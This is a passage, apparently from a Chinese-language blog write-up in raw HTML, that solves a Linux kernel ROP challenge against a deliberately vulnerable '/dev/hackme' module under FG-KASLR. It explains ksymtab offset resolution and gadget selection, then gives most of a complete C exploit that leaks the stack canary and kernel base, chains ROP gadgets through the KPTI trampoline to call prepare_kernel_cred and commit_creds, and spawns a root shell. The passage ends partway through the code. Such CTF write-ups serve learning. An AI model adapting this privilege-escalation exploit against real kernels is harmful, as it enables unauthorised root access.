.text.vdso_mremap PROGBITS         ffffffff81401170  <span class="number">00601170</span></span><br><span class="line">  [<span class="number">12</span>] .text.<span class="type">find_t</span>[...] PROGBITS         ffffffff81401210  <span class="number">00601210</span></span><br><span class="line">  [<span class="number">13</span>] .text.vvar_fault  PROGBITS         ffffffff81401230  <span class="number">00601230</span></span><br><span class="line">  [<span class="number">14</span>] .text.arch_g[...] PROGBITS         ffffffff81401450  <span class="number">00601450</span></span><br><span class="line">  [<span class="number">15</span>] .text.vdso_j[...] PROGBITS         ffffffff81401470  <span class="number">00601470</span></span><br></pre></td></tr></table></figure>
+
+<p>除去纯正的<code>.text</code>节之外, 还有很多<code>.text.*</code>的节, 这些节都很小,甚至二三十字节一个, 节里面也就一两个函数</p>
+<p>其作用就是每个节都可以随机排列, 实现<code>FG-KASLR</code></p>
+<p>但是🐎还没有死完</p>
+<p><code>.text</code>节是一整个儿,只会整体参与ASLR,但是节内的函数不会参与<code>FG-KASLR</code>,而节内函数就有<code>swapgs_restore_regs_and_return_to_usermode</code>,</p>
+<p><code>.text</code>节在未开启<code>KASLR</code>时的范围: <code>0xffffffff81000000 ~ 0xffffffff81400dd7</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text @ 0xffffffff81000000 </span><br><span class="line">swapgs_restore_regs_and_return_to_usermode @ 0xffffffff81200f10		offset_to_text = 0x200f10</span><br><span class="line">kpti_trampoline @ 0xffffffff81200f26								offset_to_text = 0x200f26</span><br></pre></td></tr></table></figure>
+
+<p><code>ksymtab</code>不属于任何<code>text</code>节,只参与<code>KASLR</code>,因此<code>ksymtab</code>到<code>.text</code> 的偏移量也是固定的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab @ <span class="number">0xffffffff81f85198</span>		offset_to_text = <span class="number">0xf85198</span></span><br></pre></td></tr></table></figure>
+
+<p><code>ksymtab</code>是一个映射表表中的每一项都长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">	  <span class="type">int</span> value_offset;				<span class="comment">//符号地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> name_offset;				<span class="comment">//符号名地址 相对于 本字段 的偏移量</span></span><br><span class="line">	  <span class="type">int</span> namespace_offset;			<span class="comment">//符号命名空间地址, 相对于 本字段 的偏移量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这三个字段的意义是什么呢? 以commit_creds函数为例,</p>
+<p>首先在未开启KASLR的内核上,找到它在ksymtab中的地址,是<code>0xffffffff81f87d90</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep <span class="string">&quot;commit_creds&quot;</span></span></span><br><span class="line">ffffffff814c6410 T commit_creds</span><br><span class="line">ffffffff81f87d90 r __ksymtab_commit_creds</span><br><span class="line">ffffffff81fa0972 r __kstrtab_commit_creds</span><br><span class="line">ffffffff81fa4d42 r __kstrtabns_commit_creds</span><br></pre></td></tr></table></figure>
+
+<p>然后在gdb中打印<code>ffffffff81f87d90</code>处三个双字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/3wx 0xffffffff81f87d90</span><br><span class="line">0xffffffff81f87d90:     0xff53e680      0x00018bde      0x0001cfaa</span><br></pre></td></tr></table></figure>
+
+<p>也就是说</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value_offset = 0xff53e680</span><br><span class="line">name_offset = 0x00018bde</span><br><span class="line">name_space_offset = 0x0001cfaa</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>value_offset</code>是符号实际地址与本字段<code>kernel_symbol.value_offset</code>的偏移量</p>
+<p>符号描述符__ksymtab_commit_creds的地址在<code>0xffffffff81f87d90</code></p>
+<p>符号与符号描述符的距离是<code>((1&lt;&lt;32) - 0xff53e680)</code>,由此计算得到符号地址在<code>0xffffffff814c6410</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffffff81f87d90</span> - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - <span class="number">0xff53e680</span>)</span><br><span class="line">$<span class="number">17</span> = <span class="number">0xffffffff814c6410</span></span><br></pre></td></tr></table></figure>
+
+<p>同理name_offset也是符号名字符串所在地址相对于本字段<code>kernel_symbol.name_offset</code>的偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0xffffffff81fa0972 - 0xffffffff81f87d94</span><br><span class="line">$22 = 0x18bde</span><br></pre></td></tr></table></figure>
+
+<p>同理name_space_offset是符号命名空间字符串与本字段<code>kernel_symbol.namespace_offset</code>的偏移量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>s <span class="number">0xffffffff81fa4d42</span></span><br><span class="line"><span class="number">0xffffffff81fa4d42</span>:     <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d43</span>:     <span class="string">&quot;bpf_trace_run11&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d53</span>:     <span class="string">&quot;bpf_trace_run12&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d63</span>:     <span class="string">&quot;kprobe_event_cmd_init&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d79</span>:     <span class="string">&quot;__kprobe_event_gen_cmd_start&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4d96</span>:     <span class="string">&quot;__kprobe_event_add_fields&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4db0</span>:     <span class="string">&quot;kprobe_event_delete&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4dc4</span>:     <span class="string">&quot;__tracepoint_suspend_resume&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4de0</span>:     <span class="string">&quot;__tracepoint_cpu_idle&quot;</span></span><br><span class="line"><span class="number">0xffffffff81fa4df6</span>:     <span class="string">&quot;__tracepoint_cpu_frequency&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到,这个符号属于一个通用的命名空间</p>
+</blockquote>
+<p>回到本题中,思路如下:</p>
+<p>1.<code>hackme_read</code>函数中泄露<code>canary</code>, 一个<code>text</code>段的地址, 计算得到<code>text</code>基地址, 以及<code>ksymtab</code>地址等</p>
+<p>2.<code>ksymtab </code>中查到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的地址</p>
+<p>3.构造<code>rop</code>链条</p>
+<h4 id="1-栈上泄露一个text-地址"><a href="#1-栈上泄露一个text-地址" class="headerlink" title="1.栈上泄露一个text 地址"></a>1.栈上泄露一个<code>text</code> 地址</h4><p>在<code>read</code>函数中之前我们只泄露了<code>canary</code>值, 现在还要再泄露一个<code>text</code>段的地址,以此计算<code>text</code>段基地址</p>
+<p>在未开启<code>KASLR</code>的情况下观察从<code>kstack_buf</code>开始的堆栈上,是否存在一个<code>text</code>段的地址 ,结果发现还真有</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20241125151929536.png" alt="image-20241125151929536"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x <span class="number">0xffffc900001bff38</span> <span class="number">-0xffffc900001bfe08</span></span><br><span class="line">$<span class="number">4</span> = <span class="number">0x130</span></span><br><span class="line">pwndbg&gt; p/x <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">5</span> = <span class="number">0x26</span></span><br><span class="line">pwndbg&gt; p <span class="number">0x130</span>/<span class="number">8</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">38</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说 ,<code>stack_buf + 0x130 </code>字节开始处的一个四字就是这个泄露</p>
+<h4 id="2-从ksymtab中查函数地址"><a href="#2-从ksymtab中查函数地址" class="headerlink" title="2.从ksymtab中查函数地址"></a>2.从<code>ksymtab</code>中查函数地址</h4><p>内存任意读,这也可以通过<code>gadget</code>实现</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop<span class="meta"># cat gadgets.ropgadget | grep <span class="string">&quot; : mov rax.*qword ptr .* ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span></span><br><span class="line"><span class="number">0xffffffff81004aad</span> : mov rax, qword ptr [rax + <span class="number">0x10</span>] ; pop rbp ; ret</span><br><span class="line"><span class="number">0xffffffff81015a7f</span> : mov rax, qword ptr [rax] ; pop rbp ; ret</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>0xffffffff81015a7f : mov rax, qword ptr [rax] ; pop rbp ; ret</code>这个<code>gadget</code>,还需要一个能够控制<code>rax</code>值的<code>gadget</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rax ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81004d11 : pop rax ; ret</span><br></pre></td></tr></table></figure>
+
+<p>还需要一个控制<code>rdi</code>寄存器作为函数参数的<code>gadget</code></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Destroyer:/usr/src/kernel-rop# <span class="built_in">cat</span> gadgets.ropgadget | grep <span class="string">&quot;pop rdi ; ret&quot;</span> | grep <span class="string">&quot;0xffffffff81[0123]&quot;</span></span><br><span class="line">0xffffffff81006370 : pop rdi ; ret</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3-构造ROP链条"><a href="#3-构造ROP链条" class="headerlink" title="3.构造ROP链条"></a>3.构造ROP链条</h4><p>1.任意内存读泄露<code>prepare_kernel_creds</code>函数偏移量</p>
+<p>2.<code>kpti-trampoline</code>返回到用户态,计算<code>prepare_kernel_creds</code>函数地址</p>
+<p>3.任意内存读泄露<code>commit_creds</code>函数偏移量</p>
+<p>4.<code>kpti-trampoline</code>返回到用户态,计算<code>commit_creds</code>函数地址</p>
+<p>5.<code>ret2 prepare_kernel_creds</code></p>
+<p>6.<code>kpti-trampoline</code>返回到用户态,保存<code>init_task @ rax </code></p>
+<p>7.<code>init_task pop to rdi</code></p>
+<p>8.<code>ret2 commit_creds</code></p>
+<p>9.<code>kpti-trampoline</code>返回到用户态,起<code>shell</code></p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> addr_leak;</span><br><span class="line"><span class="type">size_t</span> off_leak = <span class="number">0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_text_base;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab = <span class="number">0xf85198</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_commit_creds = <span class="number">0xf87d90</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_commit_creds;</span><br><span class="line"><span class="type">size_t</span> addr_commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_ksymtab_prepare_kernel_cred = <span class="number">0xf8d4fc</span>;</span><br><span class="line"><span class="type">size_t</span> addr_ksymtab_prepare_kernel_cred;</span><br><span class="line"><span class="type">size_t</span> addr_prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_kpti_trampoline = <span class="number">0x200f26</span>;</span><br><span class="line"><span class="type">size_t</span> addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_deref_rax_pop_rbp_ret = <span class="number">0x15a7f</span>;</span><br><span class="line"><span class="type">size_t</span> addr_deref_rax_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rax_ret = <span class="number">0x4d11</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rax_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> off_pop_rdi_ret = <span class="number">0x6370</span>;</span><br><span class="line"><span class="type">size_t</span> addr_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> addr_init_task_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"><span class="type">size_t</span> canary;</span><br><span class="line"><span class="type">int</span> value_offset;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs;</span><br><span class="line"><span class="type">size_t</span> user_ss;</span><br><span class="line"><span class="type">size_t</span> user_sp;</span><br><span class="line"><span class="type">size_t</span> user_rflags;</span><br><span class="line"><span class="type">size_t</span> user_rip;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>;   </span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    save_state();   <span class="comment">//保存进入内核之前的用户态上下文</span></span><br><span class="line">    open_dev();     <span class="comment">//打开设备</span></span><br><span class="line">    leak();  <span class="comment">//泄露canary</span></span><br><span class="line">    leak_prepare_kernel_cred();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] should never be reached&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">open_dev</span><span class="params">()</span>&#123;</span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,O_RDWR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *argv[] = &#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    user_rip = spawn_shell;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking canary and text base&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> buffer[<span class="number">40</span>];</span><br><span class="line">    read(dev_fd,buffer,<span class="number">40</span>*<span class="number">8</span>);</span><br><span class="line">    canary = buffer[<span class="number">0x10</span>];</span><br><span class="line">    addr_leak = buffer[<span class="number">38</span>];</span><br><span class="line"></span><br><span class="line">    addr_text_base = addr_leak - off_leak;</span><br><span class="line">    addr_kpti_trampoline = addr_text_base + off_kpti_trampoline;</span><br><span class="line">    addr_ksymtab = addr_text_base + off_ksymtab;</span><br><span class="line">    addr_ksymtab_commit_creds = addr_text_base + off_ksymtab_commit_creds;</span><br><span class="line">    addr_ksymtab_prepare_kernel_cred = addr_text_base + off_ksymtab_prepare_kernel_cred;</span><br><span class="line">    addr_deref_rax_pop_rbp_ret = addr_text_base + off_deref_rax_pop_rbp_ret;</span><br><span class="line">    addr_pop_rax_ret = addr_text_base + off_pop_rax_ret;</span><br><span class="line">    addr_pop_rdi_ret = addr_text_base + off_pop_rdi_ret;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked canary: %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_leak: %p\n&quot;</span>,addr_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_text_base: %p\n&quot;</span>,addr_text_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_kpti_trampoline: %p\n&quot;</span>,addr_kpti_trampoline);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab: %p\n&quot;</span>,addr_ksymtab);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_commit_creds: %p\n&quot;</span>,addr_ksymtab_commit_creds);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_ksymtab_prepare_kernel_cred: %p\n&quot;</span>,addr_ksymtab_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_deref_rax_pop_rbp_ret: %p\n&quot;</span>,addr_deref_rax_pop_rbp_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rax_ret: %p\n&quot;</span>,addr_pop_rax_ret);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_pop_rdi_ret: %p\n&quot;</span>,addr_pop_rdi_ret);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Leak complete\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking prepare_kernel_cred offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_prepare_kernel_cred;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_prepare_kernel_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[+] prepare_kernel_cred offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_prepare_kernel_cred = addr_ksymtab_prepare_kernel_cred - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_prepare_kernel_cred: %p\n&quot;</span>,addr_prepare_kernel_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_prepare_kernel_cred calculated\n&quot;</span>);</span><br><span class="line">    leak_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span 